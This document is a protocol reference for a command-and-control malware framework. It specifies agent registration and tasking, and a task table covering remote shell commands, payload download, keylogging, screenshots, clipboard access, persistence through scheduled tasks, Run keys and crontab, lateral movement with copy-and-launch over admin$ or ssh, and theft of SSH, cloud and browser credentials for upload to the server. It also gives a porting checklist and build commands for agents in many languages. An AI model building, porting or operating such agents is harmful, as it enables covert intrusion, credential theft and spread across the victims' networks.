# C2 Wire Protocol

Reference spec for the agent <-> server communication. Anything that speaks this
HTTP/JSON protocol can be an agent, which is why the client has been ported to
multiple languages (see `clients/`).

Base URL: the `--server` value given to the agent, e.g. `http://127.0.0.1:8000`.

---

## Authentication

Every agent request must carry the shared agent token:

```
X-Agent-Token: <AGENT_TOKEN>
```

The token is generated on first server start and persisted in
`server/.agent_token` on Windows / `server/.agent_token_wsl` on Unix (print it
with `Get-Content server\.agent_token` / `cat server/.agent_token_wsl`).
Protect this file — anyone holding the token can register agents and (with the
dashboard password) task them.

All bodies are JSON (`Content-Type: application/json`), except file uploads.

---

## Endpoints

### 1. Register — `POST /api/register`

Registers (or re-syncs) an agent. The server returns a stable `agent_id` that the
agent must persist and send on every subsequent request. If `agent_id` is omitted
(or unknown), a new one is generated.

Request:

```json
{
  "agent_id": "optional, resume an existing agent",
  "hostname": "victim-pc",
  "username": "bob",
  "os": "windows",
  "arch": "AMD64",
  "pid": 1234,
  "ip": "10.0.0.5"
}
```

Response `200`:

```json
{ "agent_id": "3f2c...", "status": "registered" }
```

### 2. Checkin — `POST /api/checkin`

Heartbeat. The server updates `last_seen` and returns all pending tasks
(atomically claimed, so a task is handed to exactly one checkin).

Request:

```json
{ "agent_id": "3f2c..." }
```

Response `200`:

```json
{
  "tasks": [
    { "task_id": "a1b2...", "type": "shell", "args": { "command": "whoami", "timeout": 30 } },
    { "task_id": "c3d4...", "type": "download", "args": { "file": "payload.exe", "destination": "C:\\Temp\\payload.exe" } },
    { "task_id": "e5f6...", "type": "upload", "args": { "path": "C:\\Temp\\dump.txt" } },
    { "task_id": "g7h8...", "type": "sleep", "args": { "seconds": 15 } },
    { "task_id": "i9j0...", "type": "exit", "args": {} }
  ]
}
```

Response `404` means the server no longer knows this `agent_id` — the agent must
call `/api/register` again.

> **Claiming and retry.** A checkin atomically claims every returned task
> (`pending -> sent`). If the agent has not reported a result for a task within
> `C2_RETRY_AFTER` seconds (default `180`), the next checkin of that same agent
> flips the task back to `pending` so it is handed out again. An operator can
> also re-queue a `sent`/`failed` task from the dashboard.

### 3. Report result — `POST /api/result`

Delivers the outcome of a task.

Request:

```json
{
  "agent_id": "3f2c...",
  "task_id": "a1b2...",
  "output": "acme\\bob",
  "exit_code": 0,
  "error": ""
}
```

`error` non-empty => task marked `failed`; otherwise `completed`.
Response: `{ "ok": true }` or `404` if the task id does not belong to the agent.

### 4. File download — `GET /api/files/{task_id}`

Used by the agent when it receives a `download` task. The server resolves the
file named in the task's `args.file` from its `shared/` folder and streams it.
Authenticate with the same `X-Agent-Token` header.

### 5. File upload — `POST /api/files/{task_id}`

Used by the agent when it receives an `upload` task. Send the file as
`multipart/form-data` (field name `file`). The server stores it in `collected/`
as `<agent_id>__<task_id>__<original name>`.

---

## Task types

| type       | args                                          | behaviour                                                                 |
|------------|-----------------------------------------------|---------------------------------------------------------------------------|
| `shell`    | `{"command": "...", "timeout": 120}`          | Run through the OS shell; output truncated to 12000 chars. Default timeout 120s (max 3600); `timeout` is optional and per-task |
| `download` | `{"file": "name", "destination": "path"}`     | Pull `shared/<file>` from the server. `destination` optional — defaults to the file name in the agent CWD; a directory destination appends the file name; parent dirs are created |
| `upload`   | `{"path": "/abs/path"}`                       | Push a local file to the server `collected/` folder                        |
| `clipboard`| `{"action": "get\|set", "text": "..."}`       | Read or write the system clipboard. `get` returns current clipboard contents; `set` writes `text` to clipboard. Platform-specific: Windows (PowerShell Get/Set-Clipboard), Linux (xclip/xsel), macOS (pbpaste/pbcopy). |
| `keylog`   | `{"action": "start\|stop\|dump"}`             | Keystroke logger. `start` begins recording, `stop` halts, `dump` returns buffered keystrokes. Keystrokes accumulate in memory until dumped. Platform-specific: Windows (GetAsyncKeyState), Linux (/dev/input), macOS (CGEvent via rdev). Python agent requires `pynput`. |
| `screenshot` | `{"name": "optional-filename"}`            | Capture the desktop and upload the PNG to the server via `POST /api/files/{task_id}` (stored under `collected/`). Requires ImageMagick `import`, `scrot`, `gnome-screenshot`, `screencapture` (macOS), or PowerShell DPI-aware capture (Windows). |
| `sleep`    | `{"seconds": N}`                              | Change heartbeat interval (min 1)                                          |
| `persistence` | `{}` (optional `{"method": "auto"}`)      | Copy the agent into a persistent startup path and register it so it re-launches on logon/reboot with the same `--server`/`--token`/`--interval`/`--jitter`. Windows: `%APPDATA%\Microsoft\Windows\c2update\c2agent*` + scheduled task `c2agent-persist` (ONLOGON, HIGHEST) with an `HKCU\...\Run` key fallback. Linux/macOS: `~/.config/c2update/` + `@reboot <cmd> # c2agent-persist` crontab line (deduped) and a `systemd --user` unit. exit_code 0 when at least one mechanism succeeds. |
| `lateral`  | `{"subnet": "192.168.1.0/24", "user": "...", "pass": "..."}` | Discover LAN peers (parses `arp -a`/`ip neigh` within the local subnet or the given CIDR) then best-effort copy + launch this same agent on each. Credentials may be passed in args or read from env `C2_LAT_USER`/`C2_LAT_PASS`; peers without credentials are reported as skipped. Windows deploy via `net use \\host\admin$` + `copy` + `schtasks`, Unix via `sshpass scp` + `ssh 'nohup <cmd> &'`. Output lists each peer's status then `lateral: deployed=N failed=N skipped=N`. exit_code 0 when peers are found, 1 otherwise. |
| `steal`    | `{"profile": "all\|env\|tokens\|browser"}`                    | Collect credentials-ish material **raw** (no decryption on the agent): env vars whose names match sensitive keywords, common credential/token files under `~` (`.aws`, `.ssh`, `.docker`, `.kube`, `.git-credentials`, `.npmrc`, …) and browser SQLite DBs (`Login Data`/`Cookies`/`Web Data`, Firefox `cookies.sqlite`/`logins.json`/`key4.db`/`cert9.db`). Results are zipped into `steal.zip` and uploaded via `POST /api/files/{task_id}`; the reported output is a manifest listing. `profile` defaults to `all`; files over 8 MB are skipped. |
| `clone`    | `{"action": "start\|stop\|status", "target": "...", "command": "...", "interval": N}` | Cross-agent resurrection watchdog. `start` begins a background watcher on `target` (default: self) that polls `GET /api/clone/status/{target}` every `interval` seconds (default 30, clamped 5–3600) and runs `command` (through the shell, detached) the moment the target is `dead`/`stale`. `stop` ends the watcher, `status` lists running watchers. |
| `exit`     | `{}`                                          | Terminate the agent loop                                                   |

`args` is always a JSON object (may be empty `{}`).
`timeout` and `destination` are optional on the wire — all reference clients
honour them when present, and fall back to the defaults above otherwise.

---

## Agent lifecycle

1. Agent generates/loads `agent_id` from its local state file (`~/.c2agent.json`).
2. First run: `POST /api/register` -> store returned `agent_id`.
3. Loop:
   - `POST /api/checkin` -> get tasks
   - execute each task
   - `POST /api/result` for each task
   - sleep `interval + jitter` seconds
4. On `404` from checkin -> re-register and continue.
5. On `exit` task -> report and stop.

---

## Porting checklist (new language)

1. HTTP client with custom header `X-Agent-Token`.
2. JSON encode/decode with snake_case field names (`agent_id`, `exit_code`, ...).
3. Persist `agent_id` to a state file.
4. Implement all task types listed above; unknown types -> report `exit_code: 1`.
5. Shell execution: Windows `cmd /C <cmd>`, POSIX `sh -c <cmd>`.
6. **Shell timeout:** run the command in a child process, enforce the per-task
   `timeout` (default 120s) by killing it and reporting `exit_code: 124`.
   Patterns per language: Python `subprocess.run(..., timeout=)`,
   Go `exec.CommandContext` + `context.WithTimeout`, C# `Process.WaitForExit(ms)`
   then `Kill()`, Rust `try_wait()` poll loop + `kill()`, PowerShell
   `Process.WaitForExit(ms)` + `Kill()`, Bash `timeout(1)` with a background+poll
   fallback.
7. **Download destination:** if `args.destination` is a directory (or ends with
   a path separator) append `args.file`; create the parent directory before saving.
8. **Jitter:** accept `--jitter N` (seconds) and sleep `interval + random(0..N)`.
9. Send the local IP best-effort (UDP connect to `8.8.8.8:80` trick or equivalent).
10. Accept the token via `--token` and the `C2_TOKEN` environment variable.
11. All agents must support the same six environment variables
    (`C2_SERVER`, `C2_TOKEN`, `C2_INTERVAL`, `C2_JITTER`, `C2_STATE_FILE`,
    `C2_VERBOSE`) as flag fallbacks and answer `-h`/`--help`.

Reference ports and build commands:

| file          | language       | run / build command |
|---------------|----------------|---------------------|
| `agent.py`    | Python 3.9+    | `pip install requests; python agent.py --server ... --token ...` |
| `agent.js`    | Node.js        | `node agent.js --server ... --token ...` |
| `agent.sh`    | Bash           | `./agent.sh --server ... --token ...` (needs curl + jq) |
| `agent.ps1`   | PowerShell 5+  | `pwsh -File agent.ps1 -Server ... -Token ...` (or `powershell -ExecutionPolicy Bypass -File ...`) |
| `agent.php`   | PHP CLI        | `php agent.php --server ... --token ...` |
| `agent.rb`    | Ruby           | `ruby agent.rb --server ... --token ...` |
| `agent.pl`    | Perl           | `perl agent.pl --server ... --token ...` |
| `agent.lua`   | Lua 5.x        | `lua agent.lua --server ... --token ...` (needs `luasocket`) |
| `agent.go`    | Go 1.21+       | `go build -o agent agent.go clone_unix.go keylog_linux.go` |
| `agent.rs`    | Rust           | `cargo build --release` (needs `reqwest`, `serde`, `rdev`, `hostname`, `rand`) |
| `agent.c`     | C (gcc/clang + libcurl) | `gcc -O2 -o agent agent.c -lcurl` |
| `agent.cpp`   | C++ (g++ + libcurl)     | `g++ -O2 -o agent agent.cpp -lcurl` |
| `agent.cs`    | .NET 8+        | `dotnet build agent.csproj -c Release` |
| `agent.java`  | JDK 11+        | `javac -encoding UTF-8 agent.java && java Agent` |

### Build toolchains for server-side compilation

The server-side builder (`generate.html` → "build on server") uses:

| Toolchain | Install (Windows)                                          | Install (Linux / WSL)                       | Install (macOS)           | Notes |
|-----------|------------------------------------------------------------|---------------------------------------------|---------------------------|-------|
| Go        | `winget install GoLang.Go` / `scoop install go`           | `apt-get install golang`                    | `brew install go`         | |
| Rust      | `winget install Rustlang.Rustup` / `scoop install rustup` | `apt-get install rustc cargo`               | `brew install rust`       | add targets with `rustup target add` |
| C / C++   | `winget install BrechtSanders.WinLibs.POSIX.UCRT` / `scoop install mingw` | `apt-get install build-essential libcurl4-openssl-dev` | `brew install gcc` | libcurl headers needed |
| .NET SDK  | `winget install Microsoft.DotNet.SDK.8` / `scoop install dotnet-sdk` | `apt-get install dotnet-sdk-8.0` or `./dotnet-install.sh` | `brew install dotnet` | C# publishes to all RIDs (win/linux/osx) |
| Java      | `winget install Oracle.JDK` / `scoop install openjdk`     | `apt-get install openjdk-17-jdk`            | `brew install openjdk`    | JDK 11+ |

On Linux/macOS, the bundled `dotnet-install.sh` can install the SDK to
`~/.dotnet` without root and persists `PATH` to the shell profile automatically.
